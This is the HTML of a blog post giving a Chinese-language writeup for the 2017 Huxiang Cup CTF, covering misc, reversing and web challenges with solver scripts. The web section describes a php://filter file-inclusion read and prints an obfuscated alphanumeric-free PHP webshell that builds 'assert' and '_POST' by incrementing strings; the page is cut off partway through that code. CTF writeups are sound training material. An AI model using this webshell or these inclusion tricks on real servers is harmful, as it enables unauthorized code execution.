@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>2017湖湘杯 | Archimesan</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="2017湖湘杯网络安全大赛Writeup">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017湖湘杯">
+<meta property="og:url" content="http://archimesan.me/2017/12/15/2017湖湘杯/index.html">
+<meta property="og:site_name" content="Archimesan">
+<meta property="og:description" content="2017湖湘杯网络安全大赛Writeup">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/misc150.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/misc150-flag.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/misc200.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/misc200-flag.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/RE100_1.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/RE100_2.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/android.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/android_flag.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/web-150.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/web-200.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn100_1.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn100_2.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn100_3.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn100_4.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn100_5.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn100_6.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn100_7.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn100_8.png">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn200_1.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn200_2.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn200_3.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn200_4.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn200_5.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn300_1.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn300_2.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn300_3.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn300_4.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn300_5.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn300_6.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn300_7.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_1.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_2.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_3.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_4.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_5.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_6.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_7.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_8.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_9.jpg">
+<meta property="og:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/pwn400_10.jpg">
+<meta property="og:updated_time" content="2017-12-15T03:08:44.372Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2017湖湘杯">
+<meta name="twitter:description" content="2017湖湘杯网络安全大赛Writeup">
+<meta name="twitter:image" content="http://archimesan.me/2017/12/15/2017湖湘杯/misc150.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Archimesan" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Archimesan</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">因为深爱，所以无所畏惧！</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/Home">博客首页</a></li>
+                        
+                            <li><a href="/archives">作品展示</a></li>
+                        
+                            <li><a href="/2017/12/14/CTF学习/">CTF学习</a></li>
+                        
+                            <li><a href="/FrontEndGuide">前端导航</a></li>
+                        
+                            <li><a href="/tags">文章标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1406579947@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/archimesan" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="#" title="weibo">weibo</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/工具下载/" style="font-size: 10px;">工具下载</a> <a href="/tags/常见漏洞/" style="font-size: 16.67px;">常见漏洞</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://archimesan.me">name</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱学习、爱dota、爱荣耀，更爱家庭的普通宅。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Archimesan</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Archimesan</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">因为深爱，所以无所畏惧！</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/Home">博客首页</a></li>
+                
+                    <li><a href="/archives">作品展示</a></li>
+                
+                    <li><a href="/2017/12/14/CTF学习/">CTF学习</a></li>
+                
+                    <li><a href="/FrontEndGuide">前端导航</a></li>
+                
+                    <li><a href="/tags">文章标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1406579947@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/archimesan" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-2017湖湘杯" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/12/15/2017湖湘杯/" class="article-date">
+      <time datetime="2017-12-15T01:21:39.000Z" itemprop="datePublished">2017-12-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2017湖湘杯
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>2017湖湘杯网络安全大赛Writeup</p>
+<a id="more"></a>
+<p>复赛为web渗透，反编译，破解，加密&amp;解密 一共15道题。</p>
+<h1 id="Misc100-热身运动"><a href="#Misc100-热身运动" class="headerlink" title="Misc100 热身运动"></a>Misc100 热身运动</h1><p>64 个棋盘格子，每一帧都有不同的头像在一个格子里面，想到六十四进制和 Base64 编码。<br>将头像的格子换成数字，再对应 Base64 编码，最后解密得到 flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">25,38,49,33,25,55,44,49,29,5,60,49,13,21,61,38,29,22,57,46,30,23,52</span><br><span class="line">ZmxhZ3sxdF8xNV9mdW5ueX0=</span><br><span class="line">flag&#123;1t_15_funny&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Misc150-流量分析"><a href="#Misc150-流量分析" class="headerlink" title="Misc150 流量分析"></a>Misc150 流量分析</h1><p>WireShark 打开 pcap 直接导出 flag.zip 打开后是 ce.txt</p>
+<p><img src="misc150.png" alt=""></p>
+<p>是 RGB 值，写脚本解出 flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">x = 887 </span><br><span class="line">y = 111 </span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>,(x,y))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rgb1 = [****]</span></span><br><span class="line">m=0</span><br><span class="line">file = open(<span class="string">'ce.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(0,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(0,y):</span><br><span class="line"></span><br><span class="line">        <span class="comment">#line = rgb1[(3*m):(3*(m+1))]</span></span><br><span class="line">        m+=1</span><br><span class="line">        rgb = c = file.readline().split(<span class="string">","</span>)</span><br><span class="line">        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))</span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="misc150-flag.png" alt=""></p>
+<h1 id="Misc200-Encryptor-apk"><a href="#Misc200-Encryptor-apk" class="headerlink" title="Misc200 Encryptor.apk"></a>Misc200 Encryptor.apk</h1><p>分析定位到 EncryptImageActivity 类，可以看到加密函数。</p>
+<p><img src="misc200.png" alt=""></p>
+<p>异或加密，在重复操作，就是把 flag 丢进去再加密一次，拉出结果文件。</p>
+<p>根据这个将加密后的文件进行解密就可以，还有就是那个 key 是字符 Password 的 md5<br>例如 bash d56a23，key 就是 bash key=[0xd5,0x6a,0x23] 这样分割。</p>
+<p><img src="misc200-flag.png" alt=""></p>
+<h1 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h1><p><a href="https://github.com/ctfs/write-ups-2016/tree/master/pragyan-ctf-2016/steganography/who-made-me-100" target="_blank" rel="noopener">原题</a></p>
+<h1 id="RE100-Re4newer"><a href="#RE100-Re4newer" class="headerlink" title="RE100 Re4newer"></a>RE100 Re4newer</h1><p>查壳发现有 UPX upx -d 文件名<br>脱掉之后 IDA 分析定位主函数进行逆向，sub_401080</p>
+<p><img src="RE100_1.png" alt=""></p>
+<p><img src="RE100_2.png" alt=""></p>
+<p>可以看到，这里可以分成44个两位16进制的数，并且顺序与箭头所指的数的大小有关。</p>
+<p>pyhon脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [0x45,0x43,0x4E,0x44,0x13,0x4A,0x76,0x59,0x71,0x4B,0x7D,0x51,0x54,0x7D,0x63,0x7D,0x7D,0x5B,0x50,0x11,0x52,0x4F,0x4B,0x51,0x70,0x7D,0x47,0x4E,0x67,0x67,0x70,0x70,0x7D,0x57,0x7D,0x67,0x71,0x51,0x63,0x52,0x5F,0x56,0x13,0x7D]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(11):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> [3,2,1,0]: </span><br><span class="line">       flag += chr( a[i*4+j]^0x22)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<h1 id="RE200-简单的-android"><a href="#RE200-简单的-android" class="headerlink" title="RE200 简单的 android"></a>RE200 简单的 android</h1><p>将apk格式改成zip解压出来</p>
+<p>使用d2x2jar反汇编拿到源码</p>
+<p><img src="android.png" alt=""></p>
+<p>使用工具jd-gui查看源码</p>
+<p><img src="android_flag.png" alt=""></p>
+<p>直接拿到flag。</p>
+<h1 id="RE400pyc-分析"><a href="#RE400pyc-分析" class="headerlink" title="RE400pyc 分析"></a>RE400pyc 分析</h1><p><a href="https://www.anquanke.com/post/id/82649" target="_blank" rel="noopener">XDCTF 原题</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def tobin(b):</span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [128,64,32,16,8,4,2,1]:</span><br><span class="line">    ret+=<span class="string">'1'</span> <span class="keyword">if</span> b&amp;i <span class="keyword">else</span> <span class="string">'0'</span></span><br><span class="line">    <span class="built_in">return</span> ret</span><br><span class="line">def decode3b(s):</span><br><span class="line">    a=s&gt;&gt;16</span><br><span class="line">    b=(s&gt;&gt;8) &amp; 0xFF</span><br><span class="line">    c=s &amp; 0xff</span><br><span class="line">    sa=tobin(a)</span><br><span class="line">    sb=tobin(b)</span><br><span class="line">    sc=tobin(c)</span><br><span class="line">    <span class="built_in">return</span> table[int(sa[2:],2)]+table[int(sb[4:]+sa[:2],2)]+table[int(sc[6:]+sb[:4],2)]+table[int(sc[:6],2)]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt; a=open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>)</span><br><span class="line">&gt;&gt;&gt; a=a.read()</span><br><span class="line">&gt;&gt;&gt; s=<span class="string">''</span></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> i <span class="keyword">in</span> xrange(0, len(a), 3):</span><br><span class="line">...     s+=decode3b(int(a[i:i+3].encode(<span class="string">'hex'</span>), 16))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line"><span class="string">'yedugr1ofbm2o4epQz8i1op2tpkxft1nf344t000000000000000'</span></span><br><span class="line">&gt;&gt;&gt; s=<span class="string">''</span>.join(map(lambda c: table[(table.index(c)+63)%64], s))</span><br><span class="line"><span class="string">'xdctfq0neal1n3doPy7h0no1sojwes0me233s"""""""""""""""'</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">xdctf&#123;0ne-l1n3d_Py7h0n_1s_@wes0me233&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Web150-random"><a href="#Web150-random" class="headerlink" title="Web150 random"></a>Web150 random</h1><p>访问 .index.php.swp 得到源码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"*********************"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"please input a rand_num !"</span>;</span><br><span class="line"><span class="keyword">function</span> create_password(<span class="variable">$pw_length</span> =  10)&#123;</span><br><span class="line">    <span class="variable">$randpwd</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$pw_length</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$randpwd</span> .= chr(mt_rand(100, 200));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$randpwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">mt_srand(time());</span><br><span class="line"></span><br><span class="line"><span class="variable">$pwd</span>=create_password();</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$pwd</span>.<span class="string">'||'</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pwd</span> == <span class="variable">$_GET</span>[<span class="string">'pwd'</span>])&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"first"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'userLogin'</span>]==<span class="variable">$_GET</span>[<span class="string">'login'</span>])</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Nice , you get the flag it is "</span>.<span class="variable">$flag</span> ;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'userLogin'</span>]=create_password(32).rand();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>是按照时间戳那生成的密码，所以快速的再提交一边密码就好了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import sys</span><br><span class="line">import urllib</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">"utf-8"</span>)</span><br><span class="line">import requests</span><br><span class="line"><span class="built_in">pwd</span> = requests.get(<span class="string">'http://114.215.138.89:10080'</span>).content[-18:-8]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pwd</span></span><br><span class="line">ans1 =  requests.get(<span class="string">'http://114.215.138.89:10080?pwd='</span>+urllib.quote(<span class="built_in">pwd</span>)).content</span><br><span class="line"><span class="built_in">print</span> ans1</span><br></pre></td></tr></table></figure>
+<p><img src="web-150.png" alt=""></p>
+<h1 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h1><p>简简单单的上传，没有套路。</p>
+<p>文件包含漏洞，直接使用 php://filter 读取 flag.php 即可获得 Base64 编码过后的 flag</p>
+<p><img src="web-200.png" alt=""></p>
+<p>base64解码得到 flag。</p>
+<p>$flag=”flag{c420fb4054e91944a71ff68f7079b9424e5cba21}”; </p>
+<h1 id="Web300"><a href="#Web300" class="headerlink" title="Web300"></a>Web300</h1><p>过滤了字母、数字和一些符号，需要上传一个 webshell</p>
+<p>找到 <a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">p 牛的文章</a>，提到了一种利用类型转换的 webshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">"<span class="variable">$_</span>"</span>; // <span class="variable">$_</span>=<span class="string">'Array'</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">'!'</span>==<span class="string">'@'</span>]; // <span class="variable">$_</span>=<span class="variable">$_</span>[0];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; // A</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; // S</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; // S</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // E </span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // R</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">'_'</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span 